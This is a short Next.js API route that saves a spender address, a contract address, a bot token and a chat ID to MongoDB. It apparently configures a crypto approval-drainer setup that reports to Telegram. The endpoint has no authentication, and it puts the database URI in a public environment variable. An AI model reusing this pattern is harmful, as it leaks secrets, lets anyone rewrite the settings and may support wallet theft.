import type { NextApiRequest, NextApiResponse } from "next";
import { MongoClient } from "mongodb";

const uri = process.env.NEXT_PUBLIC_MONGODB_URI as string;; // MongoDB connection string
const client = new MongoClient(uri);

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method === "POST") {
    const { spenderAddress, contractAddress, botToken, chatId } = req.body;

    try {
      await client.connect();
      const database = client.db("yourDatabaseName"); // Replace with your database name
      const collection = database.collection("envVariables");

      // Update the environment variables
      await collection.updateOne(
        { key: "env" },
        { $set: { spenderAddress, contractAddress, botToken, chatId } },
        { upsert: true }
      );

      res.status(200).json({ message: "Environment variables updated successfully!" });
    } catch (error) {
      console.error(error);
      res.status(500).json({ message: "Failed to update environment variables." });
    } finally {
      await client.close();
    }
  } else {
    res.setHeader("Allow", ["POST"]);
    res.status(405).end(`Method ${req.method} Not Allowed`);
  }
}
